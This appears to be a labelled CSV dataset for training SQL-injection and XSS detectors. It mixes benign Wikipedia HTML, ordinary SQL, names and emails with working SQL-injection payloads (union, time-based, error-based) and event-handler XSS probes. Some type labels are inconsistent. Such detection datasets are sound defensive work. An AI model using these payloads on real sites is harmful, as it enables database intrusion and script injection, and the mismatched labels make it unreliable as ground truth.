Text,Label,type
"<li><a href=""/wiki/Ubiquitous_computing"" title=""Ubiquitous computing"">Ubiquitous computing </a> </li>",0,xss
tait@ibizasounds.ir,0,sql
SELECT DISTINCT badly FROM pot,0,sql
"1'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   'miir' like 'miir",1,sql
"  SELECT Orders.strugglerID, Employees.truck, Employees.therefore FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.freedomID ORDER BY Orders.dearID",0,sql
"<li><a href=""/wiki/Prolog"" title=""Prolog"">Prolog </a><span class=""nowrap"">&#160; ",0,xss
AI's immediate precursors:,0,xss
SELECT zero ( s )  FROM rabbit SELECT travel FROM industry,0,sql
"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",1,sql
"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
1   )    )    as xcsm where 9231  =  9231,1,sql
"-5431""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ipmo""  =  ""ipmo",1,sql
cohn.of@evasor.ch,0,sql
40142,0,sql
"<li><a href=""/wiki/Algorithmic_efficiency"" title=""Algorithmic efficiency"">Algorithmic efficiency </a> </li>",0,xss
SELECT * FROM done WHERE center = 'forty',0,sql
" SELECT * FROM direction ORDER BY atom ASC, swimming DESC",0,sql
SELECT farther ( s FROM two RIGHT JOIN,0,sql
"<track onbeforepaste=""alert(1)"" contenteditable>test</track>",2,xss
"<pre draggable=""true"" ondragstart=""alert(1)"">test</pre>",2,xss
"<source onmouseover=""alert(1)"">test</source>",2,xss
SELECT distance ( s )  FROM safety UNION,0,xss
"<spacer onmousemove=""alert(1)"">test</spacer>",2,xss
"<body onmouseout=""alert(1)"">test</body>",2,xss
SELECT MIN ( good )  AS rhythm FROM sentence,0,sql
"	 <div style=""padding:0em 0.25em""> </div><table class=""nowraplinks navbox-subgroup"" style=""border-spacing:0""><tbody><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Concepts </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0,xss
"1%"" and sleep  (  5  )  #",1,xss
deiadrel,0,xss
"  SELECT mineID AS ID, all AS property FROM shore",0,sql
"1%""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1,sql
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'aezm' like 'aezm",1,sql
" select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,sql
"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,sql
"1%'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  '",1,sql
"<li><a href=""/wiki/Glossary_of_biology"" title=""Glossary of biology"">Biology </a> </li>",0,xss
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   '%'  =  '",1,sql
<svg><i onload=alert(1)></i>,2,xss
8arrascal485,0,sql
"admin""  )   or ""1""  =  ""1""#",1,sql
" SELECT * FROM sets ORDER BY score, fierce",0,sql
SELECT * FROM wonderful WHERE warn = 'health' LIMIT 3,0,sql
1%',1,xss
"1  )   where 9149  =  9149 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"<rb onkeyup=""alert(1)"" contenteditable>test</rb>",2,xss
sau nobrega,0,sql
SELECT Count ( * )  AS mission,0,sql
"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",1,sql
"<ul><li><a rel=""nofollow"" class=""external text"" href=""http://www.ieee-cis.org/"">IEEE Computational Intelligence Society </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20080509191840/http://www.ieee-cis.org/"">Archived </a> 9 May 2008 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> </li> </ul>",0,xss
larreynaga arce,0,sql
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,2,xss
2.79749E+15,0,sql
2.51064E+15,0,sql
1'||  (  select 'adoe' from dual where 7662  =  7662,1,sql
SELECT * FROM ship WHERE sea BETWEEN '1996-07-01' AND '1996-07-31',0,sql
50549,0,sql
" select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",1,sql
-9355' or   (  8459  =  8459  )  *4906 and 'aegf'  =  'aegf,1,sql
SELECT AVG ( later )  FROM gray  SELECT SUM ( salmon ) ,0,sql
SELECT number ( s )  FROM here FULL OUTER JOIN,0,sql
" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",1,sql
""" or 0  =  0 --",1,sql
"<cite onkeypress=""alert(1)"" contenteditable>test</cite>",2,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;333–381, </li>",0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=report&amp;rft.btitle=Searle%2C+Subsymbolic+Functionalism+and+Synthetic+Intelligence&amp;rft.pages=AI94-222&amp;rft.pub=University+of+Texas+at+Austin&amp;rft.date=1994-06&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.38.8384&amp;rft.aulast=Law&amp;rft.aufirst=Diane&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"   SELECT Employees.trace, COUNT ( Orders.happyID )  AS loseFROM    ( OrdersINNER JOIN control ON Orders.lookID  =  Employees.noddedID ) ",0,sql
lncara,0,sql
 </p>,0,xss
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Mnih, Volodymyr; Kavukcuoglu, Koray; Silver, David; Rusu, Andrei A.; Veness, Joel; Bellemare, Marc G.; Graves, Alex; Riedmiller, Martin; Fidjeland, Andreas K.; Ostrovski, Georg; Petersen, Stig; Beattie, Charles; Sadik, Amir; Antonoglou, Ioannis; King, Helen; Kumaran, Dharshan; Wierstra, Daan; Legg, Shane; Hassabis, Demis (26 February 2015). ""Human-level control through deep reinforcement learning"". <i>Nature </i>. <b>518 </b> (7540): 529–533. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2015Natur.518..529M"">2015Natur.518..529M </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1038%2Fnature14236"">10.1038/nature14236 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/25719670"">25719670 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Nature&amp;rft.atitle=Human-level+control+through+deep+reinforcement+learning&amp;rft.volume=518&amp;rft.issue=7540&amp;rft.pages=529-533&amp;rft.date=2015-02-26&amp;rft_id=info%3Apmid%2F25719670&amp;rft_id=info%3Adoi%2F10.1038%2Fnature14236&amp;rft_id=info%3Abibcode%2F2015Natur.518..529M&amp;rft.aulast=Mnih&amp;rft.aufirst=Volodymyr&amp;rft.au=Kavukcuoglu%2C+Koray&amp;rft.au=Silver%2C+David&amp;rft.au=Rusu%2C+Andrei+A.&amp;rft.au=Veness%2C+Joel&amp;rft.au=Bellemare%2C+Marc+G.&amp;rft.au=Graves%2C+Alex&amp;rft.au=Riedmiller%2C+Martin&amp;rft.au=Fidjeland%2C+Andreas+K.&amp;rft.au=Ostrovski%2C+Georg&amp;rft.au=Petersen%2C+Stig&amp;rft.au=Beattie%2C+Charles&amp;rft.au=Sadik%2C+Amir&amp;rft.au=Antonoglou%2C+Ioannis&amp;rft.au=King%2C+Helen&amp;rft.au=Kumaran%2C+Dharshan&amp;rft.au=Wierstra%2C+Daan&amp;rft.au=Legg%2C+Shane&amp;rft.au=Hassabis%2C+Demis&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
9.30174E+15,0,xss
doortje,0,sql
1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,xss
"<li><a href=""/wiki/Programming_team"" title=""Programming team"">Programming team </a> </li>",0,xss
"  SELECT * FROM strike WHERE science NOT IN  ( 'nuts', 'suggest', 'join' )  ",0,xss
"robert graves, 101",0,sql
"1%""   )    )     )   and 9198  =  9198--",1,xss
1'+  (  select oljg where 2006  =  2006 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1,sql
21,0,sql
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq",1,sql
garantir,0,sql
arceo feliu,0,sql
"  SELECT * FROM replace WHERE subject IN  ( 'managed', 'past', 'name' )  ",0,sql
1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',1,xss
bettiana,0,sql
1  )   and sleep  (  5  )  #,1,sql
"<li><a href=""/wiki/Cognition"" title=""Cognition"">Cognition </a> </li>",0,xss
 </p>,0,xss
"<li><a href=""#CITEREFHutter2005"">Hutter 2005 </a>, pp.&#160;125–126 </li> </ul>",0,xss
franklin,0,sql
"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>",2,xss
"-2140   )    )    union all select 8174,8174,8174#",1,sql
8.35555E+15,0,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--",1,xss
ve4t4nal,0,xss
32493489d,0,sql
milmarcos,0,sql
-7072'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,sql
SELECT * FROM summer 3,0,sql
calle corinto 108,0,sql
mahecha barguo,0,sql
SELECT * FROM form WHERE easier = 'mysterious' LIMIT 3,0,sql
2427,0,xss
SELECT * FROM white  WHERE constantly = wave,0,xss
"SELECT * FROM visit WHERE toward BETWEEN ""flame"" AND    ""sheet""",0,sql
477dj6r,0,sql
	 </span></a></dt><dd>Extract the data from web pages using XPath.</dd>,0,xss
"	 </span> <span class=""toctext"">Malevolent and friendly AI ",0,xss
"<picture onbeforecopy=""alert(1)"" contenteditable>test</picture>",2,xss
"1  )   as zelk where 1944  =  1944 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
 </li>,0,xss
SELECT * FROM learn FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
SELECT statement ( s )  FROM nine FULL OUTER JOIN,0,sql
zohreh,0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT * FROM couple WHERE previous = 'tone'  OR street = 'everyone',0,sql
"1  )   union all select null,null,null,null--",1,sql
"<optgroup draggable=""true"" ondragenter=""alert(1)"">test</optgroup>",2,xss
having 1  =  1--,1,sql
"	 </span> <span class=""reference-text"">",0,xss
burgs campa,0,sql
"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>",2,xss
"  SELECT discuss,heart,leaf FROM quickly LEFT JOIN Orders ON map.somehowID =  unless.finish ORDER BY very.create",0,sql
	 </span>,0,xss
SELECT * FROM tears FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM softly,0,sql
DELETE FROM blind WHERE doctor = 'palace',0,sql
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sql
1%'   )    )    union all select null#,1,sql
SELECT * FROM recognize ORDER BY floor DESC,0,sql
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,xss
"<samp onmousedown=""alert(1)"">test</samp>",2,xss
1  )   where 3979  =  3979 rlike sleep  (  5  )  --,1,xss
1  )   where 5629  =  5629,1,sql
valentik,0,sql
arqu rocas,0,sql
79856305y,0,xss
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,sql
SELECT * FROM grain  WHERE tongue NOT LIKE '[automobile]%',0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28072 )  ORDER BY meta_id ASC",0,sql
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",2,xss
"calle cortafell, 74",0,sql
<svg onpointerover=alert(1)>XSS</svg>,2,xss
"  SELECT oil,airplane,wool FROM term LEFT JOIN Orders ON shop.nutsID =  in.whenever ORDER BY held.wish",0,sql
SELECT * FROM door WHERE one BETWEEN '1996-07-01' AND '1996-07-31',0,sql
<frameset onpointerleave=alert(1)>XSS</frameset>,2,xss
	 </span> ,0,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=46"" title=""Edit section: Advertising"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"-5624' union all select 3723,3723,3723,3723,3723--",1,xss
"  SELECT youngID AS ID, price AS wrapped FROM simply",0,sql
<plaintext onpointerover=alert(1)>XSS</plaintext>,2,xss
granyena de segarra,0,sql
<marquee onpointerout=alert(1)>XSS</marquee>,2,xss
travolta@professionalhost.com.cn,0,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c839e379ee' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,xss
"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"c/ la lila, 83,",0,sql
mata hita,0,sql
"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
kaempfe amilibia,0,sql
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c885367717' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,xss
"  SELECT looseID AS ID, built AS gift FROM laid",0,sql
Discussion:,0,xss
4.61189E+15,0,sql
SELECT shore ( s )  FROM statement SELECT then FROM clock,0,sql
"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",1,sql
DELETE FROM slowly,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3088' LIMIT 1,0,sql
cary-whitten@magritte.pe,0,sql
guisset melo,0,sql
"<li class=""toclevel-2 tocsection-73""><a href=""#AI_textbooks""><span class=""tocnumber"">13.1 ",0,xss
SELECT slabs ( s FROM alike RIGHT JOIN,0,sql
SELECT * FROM excitement WHERE independent LIKE '%position%',0,sql
"<legend draggable=""true"" ondragstart=""alert(1)"">test</legend>",2,xss
"SELECT MONTH ( ""2017-06-15 09:34:21"" ) ;",0,sql
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,sql
SELECT * FROM arrow  WHERE border = quite,0,sql
"<frame draggable=""true"" ondragenter=""alert(1)"">test</frame>",2,xss
"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",1,sql
cecil.wolcott7@librodeapuntes.sv,0,sql
" select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",1,xss
<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>,2,xss
SELECT MIN ( condition )  AS sand FROM tent,0,sql
azuqueca de henares,0,sql
 (  7098  =  7098 and sleep  (  5   )    ) ,1,sql
SELECT agree FROM sink UNION SELECT brown FROM ill ORDER BY describe,0,sql
"valencia, 79 12?h",0,sql
2.97358E+15,0,xss
"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  7244  =  7244",1,sql
10960,0,xss
frechette8@legami.ly,0,xss
"SELECT ADDDATE ( ""2017-06-15 09:34:21"", INTERVAL -3 HOUR ) ;",0,sql
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1,xss
" union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",1,xss
"<a href=""/wiki/Alternating_decision_tree"" title=""Alternating decision tree"">Decision tree </a>:",0,xss
" SELECT * FROM current ORDER BY planned, behavior",0,sql
"  UPDATE bag SET bottom =  'pie', City =  'yet' WHERE mixture =  heading",0,sql
SELECT * FROM think WHERE shown BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>",2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=4"" title=""Edit section: Challenges"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"<ul><li><a href=""/wiki/The_Engine"" title=""The Engine"">The Engine </a> (<i><a href=""/wiki/Gulliver%27s_Travels"" title=""Gulliver&#39;s Travels"">Gulliver's Travels </a> </i>, 1726) </li>",0,xss
"<div draggable=""true"" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>",2,xss
esdrs,0,sql
"SELECT column1 , column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;",0,sql
1'  )   where 6622  =  6622 order by 1--,1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13506 )  ORDER BY meta_id ASC",0,sql
SELECT TOP 3 * FROM discuss WHERE enjoy = 'needle' SELECT * FROM still,0,sql
SELECT TOP 50 PERCENT * FROM nodded,0,sql
1' where 1593  =  1593,1,xss
